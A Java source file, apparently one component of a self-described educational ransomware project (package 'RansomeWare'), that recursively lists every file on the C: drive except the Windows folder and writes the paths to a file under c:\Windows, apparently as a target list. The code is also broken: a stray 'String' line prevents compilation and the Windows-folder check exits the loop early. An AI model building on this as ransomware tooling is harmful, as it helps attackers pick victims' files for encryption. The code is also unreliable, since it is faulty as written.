/********************************************************************
    _____                        _        _
   |_   _|                      | |      | |
     | |   ___ _ __   __ ____ _ | |  __  | | ____ _ _ __  ___
     | | /  _ ' |\ \ / //  _ ' || | /  \ | |/  _ ' | '__/  _  \
   __/ / | (_)  | \ V / | (_)  |\ V  /\ V  /| (_)  | |  |  ___/
  \__ /  \____,_|  \_/  \____,_| \__/ \__/  \____,_|_|  \_____|


Copyright (c) 2019 Kyra Mozley
Created on 18/07/19
Version 1.0

Disclaimer: This project is purely for educational purposes 
DO NOT RUN THIS ON YOUR PERSONAL MACHINE
EXECUTE ONLY IN A TEST ENVIRONMENT
DO NOT USE FOR MALICIOUS ACTIVITY 

 *********************************************************************/
package RansomeWare;

import java.io.*;
import java.text.SimpleDateFormat;


public class FindFiles {
    static int count = 0;
    BufferedWriter fileWriter;


    public void FindFiles() throws Exception {
        //creating a file to write flies found to
        Writer writer = new FileWriter("c:\\Windows\\output.txt", false);
        fileWriter = new BufferedWriter(writer);
        traverse("c:\\");
        fileWriter.close();
    }
    public void traverse(String path) throws Exception {
        File root = new File(path);
        File[] list = root.listFiles();

        if(list == null) return;
        for(File f: list) {
            if (f.isDirectory()) {
                String
                if (f.getName().equals("Windows")) return; //want system to still work
                traverse(f.getAbsolutePath());
                System.out.println("Dir:" + f.getAbsoluteFile());
            } else {
                SimpleDateFormat lastModified = new SimpleDateFormat("dd/MM/yyyy");
                System.out.println("File:" + f.getAbsoluteFile() + " Last Modified:" + f.lastModified());
                count++;
                fileWriter.write(f.getAbsolutePath());
                fileWriter.newLine();
            }
        }
    }

    /**
     *
     * @param args
     */
    public static void main(String[] args) throws Exception {
        FindFiles ff = new FindFiles();
        long startTime = System.nanoTime();
        ff.FindFiles();
        long endTime = System.nanoTime();
        System.out.println("Time: " + (endTime - startTime));
        System.out.println(count);
    }
}
